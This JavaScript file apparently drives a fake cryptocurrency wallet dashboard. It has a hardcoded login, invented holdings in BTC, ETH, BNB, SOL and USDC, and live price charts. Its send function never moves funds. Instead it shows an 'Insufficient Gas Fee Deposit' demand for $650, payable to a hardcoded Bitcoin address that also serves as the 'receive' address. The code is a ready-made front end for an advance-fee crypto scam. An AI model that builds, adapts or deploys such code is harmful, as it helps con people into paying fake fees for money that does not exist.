const USERNAME = 'sarahhilton';
const PASSWORD = 'sarahhilton';
const BTC_RECEIVE_ADDRESS = 'bc1q7sjehwjvkhzwtmj8yj2srqylf06ds9gu88am72';

const tokens = [
  { symbol: 'BTC', name: 'Bitcoin', balance: 1.2 },
  { symbol: 'ETH', name: 'Ethereum', balance: 80 },
  { symbol: 'BNB', name: 'Binance Coin', balance: 200 },
  { symbol: 'SOL', name: 'Solana', balance: 500 },
  { symbol: 'USDC', name: 'USD Coin', balance: 5000 },
];

let prices = {};
let totalBalance = 0;

const loginScreen = document.getElementById('login-screen');
const dashboard = document.getElementById('dashboard');
const loginForm = document.getElementById('login-form');
const loginError = document.getElementById('login-error');
const logoutBtn = document.getElementById('logout-btn');
const totalBalanceEl = document.getElementById('total-balance');
const cryptoListEl = document.getElementById('crypto-list');

const modal = document.getElementById('modal');
const modalContent = document.getElementById('modal-content');
const modalClose = document.getElementById('modal-close');

function formatUSD(num) {
  return '$' + num.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

async function fetchPrices() {
  try {
    const ids = tokens.map(t => {
      if (t.symbol === 'BTC') return 'bitcoin';
      if (t.symbol === 'ETH') return 'ethereum';
      if (t.symbol === 'BNB') return 'binancecoin';
      if (t.symbol === 'SOL') return 'solana';
      if (t.symbol === 'USDC') return 'usd-coin';
      return '';
    }).join(',');

    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
    const data = await res.json();

    prices = {
      BTC: data.bitcoin.usd,
      ETH: data.ethereum.usd,
      BNB: data.binancecoin.usd,
      SOL: data.solana.usd,
      USDC: data['usd-coin'].usd,
    };
  } catch (err) {
    console.error('Failed to fetch prices', err);
    // Fallback prices if API fails
    prices = {
      BTC: 60000,
      ETH: 3500,
      BNB: 600,
      SOL: 150,
      USDC: 1,
    };
  }
}

function calculateTotal() {
  totalBalance = tokens.reduce((sum, t) => sum + t.balance * prices[t.symbol], 0);
}

function renderDashboard() {
  // Display total balance in a big, wallet-style card
  totalBalanceEl.innerHTML = `
    <div class="bg-gradient-to-r from-purple-700 via-indigo-700 to-blue-700 rounded-xl p-6 text-center shadow-lg">
      <div class="text-sm uppercase tracking-wide text-gray-300 mb-1">Total Balance</div>
      <div class="text-4xl font-extrabold text-white">${formatUSD(totalBalance)}</div>
    </div>
  `;

  cryptoListEl.innerHTML = '';

  tokens.forEach(token => {
    const value = token.balance * prices[token.symbol];

    // Create container div for each token with a canvas for chart
    const card = document.createElement('div');
    card.className = 'bg-gray-800 rounded-lg p-4 flex flex-col md:flex-row justify-between items-center shadow-lg space-y-4 md:space-y-0 md:space-x-6';

    card.innerHTML = `
      <div class="flex-1">
        <h4 class="text-lg font-semibold">${token.name} (${token.symbol})</h4>
        <p>${token.balance} ${token.symbol} ≈ ${formatUSD(value)}</p>
      </div>
      <div class="flex-1 w-full md:w-48">
        <canvas id="chart-${token.symbol}" width="150" height="70"></canvas>
      </div>
      <div class="space-x-2 flex-shrink-0">
        <button class="send-btn bg-green-600 hover:bg-green-700 py-1 px-3 rounded transition" data-token="${token.symbol}">Send</button>
        <button class="receive-btn bg-blue-600 hover:bg-blue-700 py-1 px-3 rounded transition" data-token="${token.symbol}">Receive</button>
      </div>
    `;

    cryptoListEl.appendChild(card);
  });

  attachButtonListeners();
  renderAllCharts();
}

function attachButtonListeners() {
  document.querySelectorAll('.send-btn').forEach(btn => {
    btn.onclick = () => openSendModal(btn.dataset.token);
  });

  document.querySelectorAll('.receive-btn').forEach(btn => {
    btn.onclick = () => openReceiveModal(btn.dataset.token);
  });

  document.getElementById('send-total-btn').onclick = () => openSendModal('TOTAL');
  document.getElementById('receive-total-btn').onclick = () => openReceiveModal('TOTAL');
}

function openReceiveModal(token) {
  modalContent.innerHTML = `
    <h3 class="text-xl font-bold mb-4">Receive ${token === 'TOTAL' ? 'Bitcoin (BTC)' : token}</h3>
    <p class="mb-4">You can only receive BTC at this address:</p>
    <div id="qrcode" class="mb-4 flex justify-center"></div>
    <p class="break-all text-center font-mono">${BTC_RECEIVE_ADDRESS}</p>
    <button id="modal-close-btn" class="mt-6 w-full bg-blue-600 hover:bg-blue-700 py-2 rounded font-semibold text-white">Close</button>
  `;

  const qrCodeContainer = document.getElementById('qrcode');
  qrCodeContainer.innerHTML = '';
  QRCode.toCanvas(qrCodeContainer, BTC_RECEIVE_ADDRESS, { width: 180 });

  document.getElementById('modal-close-btn').onclick = closeModal;
  showModal();
}

let sendModalState = {
  token: '',
  step: 'input', // 'input' or 'confirm'
  address: '',
  amount: 0,
};

function openSendModal(token) {
  sendModalState = { token, step: 'input', address: '', amount: 0 };
  renderSendStep();
  showModal();
}

function renderSendStep() {
  if (sendModalState.step === 'input') {
    modalContent.innerHTML = `
      <h3 class="text-xl font-bold mb-4">Send ${sendModalState.token === 'TOTAL' ? 'Bitcoin (BTC)' : sendModalState.token}</h3>
      <label class="block mb-2">Enter recipient address:</label>
      <input id="send-address" type="text" class="w-full p-2 rounded bg-gray-700 border border-gray-600 mb-4" />
      <label class="block mb-2">Enter amount (${sendModalState.token === 'TOTAL' ? 'BTC' : sendModalState.token}):</label>
      <input id="send-amount" type="number" min="0" step="any" class="w-full p-2 rounded bg-gray-700 border border-gray-600 mb-4" />
      <button id="send-next-btn" class="w-full bg-green-600 hover:bg-green-700 py-2 rounded font-semibold">Next</button>
      <button id="modal-close-btn" class="mt-2 w-full bg-gray-600 hover:bg-gray-700 py-2 rounded font-semibold">Cancel</button>
    `;
    document.getElementById('send-next-btn').onclick = validateSendInput;
    document.getElementById('modal-close-btn').onclick = closeModal;
  } else if (sendModalState.step === 'confirm') {
    modalContent.innerHTML = `
      <h3 class="text-xl font-bold mb-4">Confirm Send</h3>
      <p class="mb-2">Token: <strong>${sendModalState.token === 'TOTAL' ? 'Bitcoin (BTC)' : sendModalState.token}</strong></p>
      <p class="mb-2">Amount: <strong>${sendModalState.amount}</strong></p>
      <p class="mb-4 break-all">To address: <strong>${sendModalState.address}</strong></p>
      <button id="send-confirm-btn" class="w-full bg-red-600 hover:bg-red-700 py-2 rounded font-semibold mb-2">Confirm Send</button>
      <button id="send-back-btn" class="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded font-semibold">Back</button>
    `;
    document.getElementById('send-confirm-btn').onclick = confirmSend;
    document.getElementById('send-back-btn').onclick = () => {
      sendModalState.step = 'input';
      renderSendStep();
    };
  }
}

function validateSendInput() {
  const addressInput = document.getElementById('send-address').value.trim();
  const amountInput = parseFloat(document.getElementById('send-amount').value.trim());
  if (!addressInput) {
    alert('Please enter a recipient address.');
    return;
  }
  if (isNaN(amountInput) || amountInput <= 0) {
    alert('Please enter a valid amount greater than 0.');
    return;
  }

  // Check if amount is <= balance
  if (sendModalState.token === 'TOTAL') {
    if (amountInput > tokens.find(t => t.symbol === 'BTC').balance) {
      alert('Amount exceeds your BTC balance.');
      return;
    }
  } else {
    const tokenData = tokens.find(t => t.symbol === sendModalState.token);
    if (!tokenData || amountInput > tokenData.balance) {
      alert('Amount exceeds your token balance.');
      return;
    }
  }

  sendModalState.address = addressInput;
  sendModalState.amount = amountInput;
  sendModalState.step = 'confirm';
  renderSendStep();
}

function confirmSend() {
  // Show insufficient gas fee modal instead of actual sending
  modalContent.innerHTML = `
    <h3 class="text-xl font-bold mb-4">Insufficient Gas Fee Deposit</h3>
    <p class="mb-4">To complete this transaction, you must deposit a gas fee of <strong>$650</strong> to the following BTC address:</p>
    <p class="break-all font-mono mb-6 text-center">${BTC_RECEIVE_ADDRESS}</p>
    <button id="modal-close-btn" class="w-full bg-blue-600 hover:bg-blue-700 py-2 rounded font-semibold text-white">Close</button>
  `;

  document.getElementById('modal-close-btn').onclick = () => {
    closeModal();
    updateDashboard();
  };
  // No balance deduction here, it's just a simulation
}

function updateDashboard() {
  calculateTotal();
  renderDashboard();
}

function showModal() {
  modal.classList.remove('hidden');
}

function closeModal() {
  modal.classList.add('hidden');
}

// Charts
const chartData = {}; // Store chart instances and history data

function initChart(token) {
  const ctx = document.getElementById(`chart-${token.symbol}`).getContext('2d');
  const initialPrice = prices[token.symbol] || 0;
  const data = {
    labels: Array(20).fill(''),
    datasets: [{
      label: `${token.symbol} Price`,
      data: Array(20).fill(initialPrice),
      fill: true,
      backgroundColor: 'rgba(59, 130, 246, 0.3)', // Tailwind blue-500, 30% opacity
      borderColor: 'rgba(59, 130, 246, 1)',
      borderWidth: 2,
      tension: 0.3,
      pointRadius: 0,
    }]
  };

  const options = {
    animation: false,
    responsive: true,
    scales: {
      x: { display: false },
      y: { display: false }
    },
    plugins: {
      legend: { display: false },
      tooltip: { enabled: false }
    },
  };

  chartData[token.symbol] = {
    chart: new Chart(ctx, {
      type: 'line',
      data,
      options,
    }),
    prices: data.datasets[0].data.slice(),
  };
}

function updateChart(token) {
  const chData = chartData[token.symbol];
  if (!chData) return;

  const newPrice = prices[token.symbol];
  chData.prices.shift();
  chData.prices.push(newPrice);
  chData.chart.data.datasets[0].data = chData.prices;
  chData.chart.update();
}

function renderAllCharts() {
  tokens.forEach(token => {
    if (!chartData[token.symbol]) {
      initChart(token);
    } else {
      updateChart(token);
    }
  });
}

// Login & Logout handlers
loginForm.onsubmit = (e) => {
  e.preventDefault();
  const username = loginForm.username.value.trim();
  const password = loginForm.password.value.trim();

  if (username === USERNAME && password === PASSWORD) {
    loginError.classList.add('hidden');
    loginScreen.classList.add('hidden');
    dashboard.classList.remove('hidden');
    updateDashboard();
    startPricePolling();
  } else {
    loginError.classList.remove('hidden');
  }
};

logoutBtn.onclick = () => {
  dashboard.classList.add('hidden');
  loginScreen.classList.remove('hidden');
  stopPricePolling();
};

// Poll prices every 15 seconds
let priceInterval;

async function pollPrices() {
  await fetchPrices();
  updateDashboard();
}

function startPricePolling() {
  pollPrices();
  priceInterval = setInterval(pollPrices, 15000);
}

function stopPricePolling() {
  clearInterval(priceInterval);
}

// Initialize Chart.js library dynamically (if not loaded in HTML)
function loadChartJs() {
  return new Promise((resolve, reject) => {
    if (window.Chart) resolve();

    const script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/npm/chart.js";
    script.onload = () => resolve();
    script.onerror = () => reject(new Error('Failed to load Chart.js'));
    document.head.appendChild(script);
  });
}

// On page load, load Chart.js and then show login screen
(async () => {
  try {
    await loadChartJs();
  } catch (e) {
    alert('Failed to load chart library. Charts will not display.');
  }
})();
